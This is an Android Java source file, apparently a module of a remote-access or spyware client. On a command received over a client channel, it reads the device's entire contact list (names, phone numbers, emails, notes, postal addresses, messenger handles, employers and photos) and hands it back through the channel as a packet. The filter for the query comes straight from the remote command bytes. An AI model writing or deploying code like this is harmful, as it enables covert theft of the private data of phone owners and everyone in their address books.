package my.app.Library;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;

import my.app.client.ClientListener;
import utils.Contact;
import Packet.ContactsPacket;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.provider.ContactsContract;

public class ContactsLister {

	public static boolean listContacts(ClientListener c, int channel, byte[] args) {
		final ArrayList<Contact> l = new ArrayList<Contact>();

		boolean ret = false;
		final String WHERE_CONDITION = new String(args);

		final ContentResolver cr = c.getContentResolver();
		final Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, WHERE_CONDITION,
			null, " DISPLAY_NAME ");

		if (cur.getCount() > 0) {
			while (cur.moveToNext()) {
				final Contact con = new Contact();

				final String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
				final long idlong = cur.getLong(cur.getColumnIndex(ContactsContract.Contacts._ID));

				final int times_contacted = cur.getInt(cur
					.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED));
				final long last_time_contacted = cur.getLong(cur
					.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED));
				final String disp_name = cur.getString(cur
					.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
				final int starred = cur.getInt(cur
					.getColumnIndex(ContactsContract.Contacts.STARRED));

				con.setId(idlong);
				con.setLast_time_contacted(last_time_contacted);
				con.setTimes_contacted(times_contacted);
				con.setDisplay_name(disp_name);
				con.setStarred(starred);

				final String name = cur.getString(cur
					.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
				if (Integer.parseInt(cur.getString(cur
					.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {

					// get the phone number
					final Cursor pCur = cr.query(
						ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
						ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
						new String[] { id }, null);
					final ArrayList<String> phones = new ArrayList<String>();
					while (pCur.moveToNext()) {
						final String phone = pCur.getString(pCur
							.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
						phones.add(phone);
					}
					pCur.close();
					con.setPhones(phones);

					// get email and type
					final Cursor emailCur = cr.query(
						ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
						ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
						new String[] { id }, null);
					if (emailCur.getCount() != 0) {
						final ArrayList<String> emails = new ArrayList<String>();
						while (emailCur.moveToNext()) {
							// This would allow you get several email addresses
							// if the email addresses were stored in an array
							final String email = emailCur.getString(emailCur
								.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
							// String emailType =
							// emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
							emails.add(email);
						}
						emailCur.close();
						con.setEmails(emails);
					}

					// Get note.......
					final String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND "
						+ ContactsContract.Data.MIMETYPE + " = ?";
					final String[] noteWhereParams = new String[] { id,
						ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE };
					final Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null,
						noteWhere, noteWhereParams, null);
					if (noteCur.getCount() != 0) {
						final ArrayList<String> notes = new ArrayList<String>();
						if (noteCur.moveToFirst()) {
							final String note = noteCur.getString(noteCur
								.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
							notes.add(note);
						}
						noteCur.close();
						con.setNotes(notes);
					}

					// Get Postal Address....
					final String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND "
						+ ContactsContract.Data.MIMETYPE + " = ?";
					final String[] addrWhereParams = new String[] { id,
						ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE };
					final Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI, null,
						addrWhere, addrWhereParams, null);

					if (addrCur.getCount() != 0) {
						while (addrCur.moveToNext()) {
							final String street = addrCur
								.getString(addrCur
									.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
							final String city = addrCur
								.getString(addrCur
									.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
							final String state = addrCur
								.getString(addrCur
									.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
							final String postalCode = addrCur
								.getString(addrCur
									.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
							final String country = addrCur
								.getString(addrCur
									.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
							final int type = addrCur
								.getInt(addrCur
									.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));

							con.setStreet(street);
							con.setCity(city);
							con.setRegion(state);
							con.setPostalcode(postalCode);
							con.setCountry(country);
							con.setType_addr(type);
						}
						addrCur.close();
					}

					// Get Instant Messenger.........
					final String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND "
						+ ContactsContract.Data.MIMETYPE + " = ?";
					final String[] imWhereParams = new String[] { id,
						ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE };
					final Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI, null, imWhere,
						imWhereParams, null);
					if (imCur.getCount() != 0) {
						final ArrayList<String> ims = new ArrayList<String>();
						if (imCur.moveToFirst()) {
							final String imName = imCur.getString(imCur
								.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
							// String imType =
							// imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.TYPE));
							ims.add(imName);
						}
						imCur.close();
						con.setMessaging(ims);
					}

					// Get Organizations.........
					final String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND "
						+ ContactsContract.Data.MIMETYPE + " = ?";
					final String[] orgWhereParams = new String[] { id,
						ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE };
					final Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI, null,
						orgWhere, orgWhereParams, null);
					if (orgCur.getCount() != 0) {
						if (orgCur.moveToFirst()) {
							final String orgName = orgCur
								.getString(orgCur
									.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
							final String title = orgCur
								.getString(orgCur
									.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));

							con.setOrganisationName(orgName);
							con.setOrganisationStatus(title);
						}
						orgCur.close();
					}

					// Picture Image
					final Uri uri = ContentUris.withAppendedId(
						ContactsContract.Contacts.CONTENT_URI, idlong);
					final InputStream input = ContactsContract.Contacts
						.openContactPhotoInputStream(cr, uri);
					if (input != null) {
						final Bitmap pic = BitmapFactory.decodeStream(input);

						final ByteArrayOutputStream bos = new ByteArrayOutputStream();
						pic.compress(CompressFormat.PNG, 0 /* ignored for PNG */, bos);
						final byte[] bitmapdata = bos.toByteArray();
						con.setPhoto(bitmapdata);
						// Bitmap bitmap =
						// BitmapFactory.decodeByteArray(bitmapdata , 0,
						// bitmapdata .length);
					}
					l.add(con);
				}

			}
			ret = true;
		} else
			ret = false;

		c.handleData(channel, new ContactsPacket(l).build());
		return ret;
	}
}
